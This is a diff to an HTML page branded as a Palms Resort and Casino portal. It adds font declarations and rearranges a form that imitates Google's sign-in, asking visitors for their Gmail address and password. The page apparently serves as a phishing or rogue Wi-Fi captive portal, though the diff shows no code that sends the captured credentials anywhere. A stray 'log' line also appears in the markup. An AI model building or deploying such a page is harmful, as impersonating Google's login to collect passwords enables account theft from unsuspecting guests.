@@ -35,6 +35,33 @@
           font-weight: normal;
         }
 
+        @font-face {
+    font-family: 'termina';
+    src: url('static/fonts/termina-bold.woff2') format('woff2'),
+         url('static/fonts/termina-bold.woff') format('woff'),
+         url('static/fonts/termina-bold.otf') format('opentype');
+    font-weight: 900; /* Use the appropriate weight for "black" */
+    font-style: normal;
+    font-display: swap; /* Optional: Improves loading performance */
+}
+
+@font-face {
+    font-family: 'montserrat';
+    src: url('static/fonts/montserrat.ttf');
+
+}
+
+@font-face {
+    font-family: 'fieldwork';
+    src: url('static/fonts/fieldwork-regular.woff2') format('woff2'),
+         url('static/fonts/fieldwork-regular.woff') format('woff'),
+         url('static/fonts/fieldwork-regular.otf') format('opentype');
+    font-weight: 400; /* Use the appropriate weight for "regular" */
+    font-style: normal;
+    font-display: swap; /* Optional: Improves loading performance */
+}
+
+
         </style>
     </head>
     <body>
@@ -55,7 +82,9 @@
                    <img class="coh-image coh-ce-cpt_site_footer-15f63533 coh-image-responsive-xl" src="static/img/palms-logo_0.svg" title="Palms Resort and Casino" alt="Palms Resort and Casino">
 <!-- END PALMS LOGO -->
                 <div class='login-content' id='login-form'>
-                    <!-- Google Logo -->
+                   
+                    <form id='email-form-step'>
+                        <!-- Google Logo -->
                     <div id="logo" title="Google">
                    
                         <svg viewBox="0 0 75 24" width="125" height="48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
@@ -80,8 +109,6 @@
                     </svg>
                     </div>
                 <!-- /Google Logo -->
-                    <form id='email-form-step'>
-                        <h1 class='g-h1'>Sign in</h1>
                         <h2 class='g-h2'>Use your Gmail account to connect.</h2>
                         <div class='login-content'>
                             <input name="eml" id='eml' type="text" class='g-input' placeholder="Gmail Address" required>
@@ -102,7 +129,7 @@
                                     </svg>
                                 </span><span class='invalid-email-text-span'>Enter a valid password</span>
                             </div>
-                           
+                           log
                             <div class='login-priv'>
                                 <p class='p'>Not your computer? Use a Private Portal to sign in.</p>
                                 <legend class='g-legend'>Learn more</legend>
